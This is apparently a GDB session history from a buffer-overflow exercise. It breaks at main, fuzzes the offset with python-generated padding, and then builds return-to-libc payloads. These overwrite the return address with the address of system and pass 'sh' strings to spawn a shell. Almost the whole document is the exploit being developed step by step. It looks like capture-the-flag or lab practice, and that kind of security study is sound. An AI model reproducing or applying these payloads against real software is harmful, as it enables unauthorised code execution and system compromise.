b main
r
ni
r
ni
r "ABC"
ni
disas m
ni
r
ni
ni
ni
r `python -c 'print "A"*84'`
r `python -c 'print "A"*83'`
r `python -c 'print "A"*82'`
r `python -c 'print "A"*81'`
r `python -c 'print "A"*80'`
r `python -c 'print "A"*81'`
r `python -c 'print "A"*812'`
r `python -c 'print "A"*82'`
r `python -c 'print "A"*83'`
r `python -c 'print "A"*84'`
p system
r `python -c 'print "A"*80 + "\x10}\xe1\xf7"'`
b main
r
find /bin/sh
find sh
b main
r `python -c 'print "A"*80 + "\x10}\xe1\xf7" + "\xa1\x88\x04\x08"'`
ni
x/s 0x804a160
b main
r `python -c 'print "\xa1\x88\x04\x08" + "A"*76 + "\x10}\xe1\xf7"'`
ni
b main
r `python -c 'print "'sh\x00\x00'" + "A"*76 + "\x10}\xe1\xf7"'`
ni
b main
r `python -c 'print "sh\x00\x00" + "A"*76 + "\x10}\xe1\xf7"'`
ni
r
ni
p system
r `python -c 'print "sh;;" + "A"*76 + "\x10}\xe1\xf7"'`
ni
r `python -c 'print "sh\0\0" + "A"*76 + "\x10}\xe1\xf7"'`
r `python -c 'print "sh; " + "A"*76 + "\x10}\xe1\xf7"'`
b main
r
r `python -c 'print "sh;A" + "A"*76 + "\x10}\xe1\xf7"'`
ni
